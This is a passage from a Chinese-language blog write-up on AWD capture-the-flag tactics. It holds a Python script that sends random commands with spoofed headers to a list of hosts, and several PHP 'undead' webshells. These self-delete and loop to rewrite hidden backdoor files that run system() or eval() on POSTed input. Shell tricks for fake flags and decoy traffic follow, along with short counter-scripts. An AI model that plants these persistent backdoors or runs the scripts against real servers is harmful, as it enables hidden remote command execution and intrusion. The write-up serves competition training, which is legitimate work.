class="params">cookie</span>):</span><br><span class="line">	<span class="comment">#随机浏览器</span></span><br><span class="line">	<span class="keyword">with</span> io.<span class="built_in">open</span>(<span class="string">&#x27;useragent.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">		user_agents = f.readlines()</span><br><span class="line">	user_agents = [ua.strip() <span class="keyword">for</span> ua <span class="keyword">in</span> user_agents]</span><br><span class="line">	<span class="comment">#http头</span></span><br><span class="line">	headers= &#123;</span><br><span class="line">		<span class="comment">#&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&#x27;,</span></span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:random.choice(user_agents),</span><br><span class="line">		<span class="string">&#x27;Cookie&#x27;</span>: cookie,</span><br><span class="line">		<span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;</span>,</span><br><span class="line">		<span class="comment">#&#x27;Referer&#x27;: referer,</span></span><br><span class="line">		<span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> headers</span><br><span class="line"><span class="comment">#请求</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">StartRequest</span>(<span class="params">method, url, data = <span class="literal">None</span>, cookies = <span class="literal">None</span>, timeout = <span class="number">3</span></span>):</span><br><span class="line">    <span class="comment">#print(url)</span></span><br><span class="line">    headers= headerbuild(cookies)</span><br><span class="line">    <span class="comment">#print(method)</span></span><br><span class="line">    <span class="comment">#print(headers)</span></span><br><span class="line">    <span class="keyword">if</span> method.lower() == <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">        url = url+ <span class="string">&#x27;?&#x27;</span> + data</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">          request = requests.get(url=url, headers=headers, timeout=timeout) </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        	<span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> method.lower() == <span class="string">&#x27;post&#x27;</span>:</span><br><span class="line">        values = <span class="built_in">dict</span>()</span><br><span class="line">        <span class="keyword">if</span> data:</span><br><span class="line">            values_list = data.strip().split(<span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> val <span class="keyword">in</span> values_list:</span><br><span class="line">                values[val.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>]] = val.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">        data = urlencode(values)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">        	request = requests.post(url = url,data = data,headers = headers,proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span>&#125;) </span><br><span class="line">        	<span class="comment">#print(request.text)</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        	<span class="keyword">pass</span>  </span><br><span class="line">    <span class="comment">#注意解码使用的方式</span></span><br><span class="line">    <span class="comment">#print(request.content.decode(&#x27;GB2312&#x27;))</span></span><br><span class="line">    <span class="comment">#print(request.content.decode(&#x27;utf8&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	<span class="comment">#获取所需数据</span></span><br><span class="line">	cmds = Get_cmd()</span><br><span class="line">	catalog = Get_catalog()</span><br><span class="line">	doc = Get_doc()</span><br><span class="line">	cookies = Get_cookie()</span><br><span class="line">	ip_list()</span><br><span class="line">	myip = <span class="string">&#x27;0.0.0.0&#x27;</span>  <span class="comment">#自己的ip</span></span><br><span class="line">	threads=<span class="number">10</span> <span class="comment">#改成自己想要的最大进程</span></span><br><span class="line">	<span class="comment">#发起请求</span></span><br><span class="line">	<span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">for</span> ip <span class="keyword">in</span> iplist:</span><br><span class="line">			<span class="comment">#print(ip)</span></span><br><span class="line">			<span class="keyword">if</span> ip==myip:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			url = Build_url(ip,catalog,doc)</span><br><span class="line">			<span class="comment">#print(url)</span></span><br><span class="line">			data = random.choice(cmds)</span><br><span class="line"></span><br><span class="line">			cookie = random.choice(cookies)</span><br><span class="line">			<span class="keyword">while</span> (threading.activeCount() &gt; threads):</span><br><span class="line">				time.sleep(<span class="number">1</span>)</span><br><span class="line">				<span class="comment">#print threading.activeCount()</span></span><br><span class="line">			Req_method = random.choice([<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;post&#x27;</span>])</span><br><span class="line">			t1 = threading.Thread(target=StartRequest, args=(Req_method,url,data,cookie,))  <span class="comment">#StartRequest(Req_method,url,data,cookie,)</span></span><br><span class="line">			t1.start()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>还有一些其它的流量混淆脚本具体可以网上找找，这里就不过多介绍了。</p>
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="不死马-流量混淆"><a href="#不死马-流量混淆" class="headerlink" title="不死马+流量混淆"></a>不死马+流量混淆</h3><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">ignore_user_abort</span>(<span class="variable"><span class="literal">true</span></span>);</span></span><br></pre></td></tr></table></figure>
+
+<p>函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">set_time_limit</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
+
+<p>函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">unlink</span><span class="params">(__FILE__)</span></span></span><br></pre></td></tr></table></figure>
+
+<p>删除文件本身，以起到隐蔽自身的作用。<br>先上传下面这个dead.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pass=<span class="number">00</span>O00OO00O0OOO0OO00OO000O0OO0OOO00OO0000OOOOOO0000</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;godspeed&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">	<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="variable">$file</span> = <span class="string">&#x27;.config.php&#x27;</span>;</span><br><span class="line">	<span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;242991be1885bca41407f38a170433aa&quot;)&#123;@system($_POST[&quot;cmd&quot;]);&#125;else&#123;echo &quot;flag&#123;8b7aa1b23253699eb88c1f18c0469fcb&#125;&quot;;&#125; ?&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">	    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">	    <span class="title function_ invoke__">usleep</span>(<span class="number">50</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>uuid版本要换一下flag flag{d7ac2d98-eda9-11ea-bbcf-525400554ea8}<br>注意下，pass不正确我们会返回一个假flagflag{8b7aa1b23253699eb88c1f18c0469fcb} 如果别人想抄我们作业不一定看得出来噢<br>上传后访问dead.php 注意由于代码里会把dead.php自身删掉了，访问的时候你会发现么有响应，这就说明不死马已经写进内存<br>访问.config.php?pass&#x3D;moresec2020<br>然后post一个cmd参数即可<br>我想了一下，为防止别人抄作业，我们可以随机pass哈哈哈哈哈哈哈哈哈<br>欢迎分析流量（分析其实也很简单，cat一下真实的flag，流量里对比着找pass就可以了）</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">...     <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span><span class="selector-class">.join</span>(random<span class="selector-class">.sample</span>(<span class="selector-attr">[<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;0&#x27;</span>]</span>*<span class="number">50</span>,<span class="number">50</span>)))</span><br><span class="line">...</span><br><span class="line">O00OO000OO000O00O000O00O0OO0O00OO0OOO00O0OOOO0000O</span><br><span class="line"><span class="number">000</span>OO0000OO00000OOOO0O0OOOO00OO000OO0000OOOO00O0OO</span><br><span class="line">O0O0OOOOO00OO000O0O0O000OOO0OOO00OOO00000O0O00O0O0</span><br><span class="line"><span class="number">0</span>O00O00OOOOOO00O000O00O00OO000O00000OOO0O00OO00O00</span><br><span class="line"><span class="number">000000</span>O0OOO0OOO0OO000OOOO0OO0O000OO000OOOO00OOO000</span><br><span class="line"><span class="number">0</span>O00O00OO0OOO0O0O0OO000OOO000000OOO0000OOOO0000O0O</span><br><span class="line">O000OOO0OOO000000OO0O00000OO0O000O0OO0O00O000OO0O0</span><br><span class="line">OO0OO0O000OO0OO0O00OO00000000OO000O0O0O0OO0OO00O0O</span><br><span class="line">OOO0O0OOO000O000O000O0O00O00OO00O0000O0OOO0OO00000</span><br><span class="line"><span class="number">0</span>O000000OO00O000O00OO0OO00O00O0O0O0OOO0OOOO0O00OOO</span><br></pre></td></tr></table></figure>
+
+<p>上面的不死马也很好克制，我们再写一个kill_dead.php 运行一下就好了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;.config.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>bash克制方式 相当于删完文件后创一个同名文件夹 不死马就没法创建了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">directory=<span class="string">&quot;/var/www/html/.config.php/&quot;</span></span><br><span class="line">file=<span class="string">&quot;/var/www/html/.config.php&quot;</span></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="variable">$file</span></span><br><span class="line"><span class="built_in">mkdir</span> <span class="variable">$directory</span></span><br></pre></td></tr></table></figure>
+
+<p>一句话 经测试最快 中木马后可以立即使用，之后再慢慢清理进程</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm .config.php &amp;&amp; mkdir .config.php/</span><br></pre></td></tr></table></figure>
+
+<p>不死马不管怎么写都是有克制的办法的，核心就是循环写他，速度比攻击者快就好了，或者创一个同名文件夹占用掉filename</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//$file = $_SERVER[&#x27;DOCUMENT_ROOT&#x27;] . &#x27;/.index.php&#x27;;</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;/var/www/html/.index.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$pass</span> = <span class="string">&#x27;cao233&#x27;</span>;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;429ff12ab245018967830cd551b126d5&quot;)&#123;@eval($_POST[&quot;cao233&quot;]);&#125;?&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>) || <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>)) != <span class="title function_ invoke__">md5</span>(<span class="variable">$content</span>))</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>RSA不死马与流量混淆</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4640#toc-1">https://xz.aliyun.com/t/4640#toc-1</a></p>
+<h2 id="骚操作"><a href="#骚操作" class="headerlink" title="骚操作"></a>骚操作</h2><h4 id="流量混淆-1"><a href="#流量混淆-1" class="headerlink" title="流量混淆"></a>流量混淆</h4><p>while true;do curl -b “PHPSESSID&#x3D;xxxx”  -A “Mozilla&#x2F;4.0 (compatible; MSIE 8.0; Windows NT 5.0)”  xxxxxxxxxx&#x2F;merchant&#x2F;classroom&#x2F;into -X POST -d “flag&#x3D;xxxxxx&#x3D;1&amp;roomid&#x3D;12”;sleep 60;done;</p>
+<h4 id="假flag、假curl"><a href="#假flag、假curl" class="headerlink" title="假flag、假curl"></a>假flag、假curl</h4><p>alias curl&#x3D;’echo flag{e4248e83e4ca862303053f2908a7020d}’<br>chmod -x &#x2F;usr&#x2F;bin&#x2F;curl</p>
+<p>alias cat&#x3D;’python -c “<strong>import</strong>(&quot;sys&quot;).stdout.write(&quot;flag</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/AWD/" rel="tag"># AWD</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/09/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1JNDI/" rel="prev" title="JNDI注入">
+      <i class="fa fa-chevron-left"></i> JNDI注入
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#AWD%E8%B5%9B%E5%88%B6"><span class="nav-text">AWD赛制</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#AWD%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87"><span class="nav-text">AWD前期准备</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86"><span class="nav-text">用户管理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E5%8F%AF%E7%99%BB%E9%99%86%E7%94%A8%E6%88%B7"><span class="nav-text">检查可登陆用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9ssh%E5%AF%86%E7%A0%81"><span class="nav-text">修改ssh密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86"><span class="nav-text">权限管理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5crontab%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90"><span class="nav-text">检查crontab执行权限</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-text">数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81%E5%8F%8A%E5%A4%87%E4%BB%BD%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88%E4%BB%A5-mysql-%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="nav-text">修改数据库密码及备份数据库（以 mysql 为例）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%87%E4%BB%BD-x2F-%E8%BF%98%E5%8E%9F%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-text">备份&#x2F;还原数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%97%ADmysql%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="nav-text">关闭mysql远程连接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E7%A0%81"><span class="nav-text">源码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD"><span class="nav-text">源码备份</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8A-WAF"><span class="nav-text">上 WAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E8%BD%AFwaf"><span class="nav-text">一些软waf</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP%E8%BD%AFwaf"><span class="nav-text">PHP软waf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pcap-search"><span class="nav-text">pcap-search</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#AWD%E6%94%BB%E5%87%BB"><span class="nav-text">AWD攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BF%AB%E9%80%9F%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-text">快速主机发现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap"><span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#goby-masscan"><span class="nav-text">goby+masscan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E8%87%AA%E5%B7%B1%E4%B8%BB%E6%9C%BA%E5%BC%80%E6%94%BE%E7%9A%84%E7%AB%AF%E5%8F%A3"><span class="nav-text">根据自己主机开放的端口</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text">代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#seay%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7"><span class="nav-text">seay代码审计工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fortity"><span class="nav-text">fortity</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#D%E7%9B%BE%E6%89%AB%E5%90%8E%E9%97%A8"><span class="nav-text">D盾扫后门</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%B9%E9%87%8F%E6%94%BB%E5%87%BB"><span class="nav-text">批量攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E6%89%B9%E9%87%8F%E8%84%9A%E6%9C%AC"><span class="nav-text">一些批量脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#burp%E7%9A%84tips"><span class="nav-text">burp的tips</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E9%87%8D%E6%94%BE"><span class="nav-text">流量重放</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E6%B7%B7%E6%B7%86"><span class="nav-text">流量混淆</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-text">权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E6%AD%BB%E9%A9%AC-%E6%B5%81%E9%87%8F%E6%B7%B7%E6%B7%86"><span class="nav-text">不死马+流量混淆</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AA%9A%E6%93%8D%E4%BD%9C"><span class="nav-text">骚操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E6%B7%B7%E6%B7%86-1"><span class="nav-text">流量混淆</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%81%87flag%E3%80%81%E5%81%87curl"><span class="nav-text">假flag、假curl</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">apsry</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">apsry</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
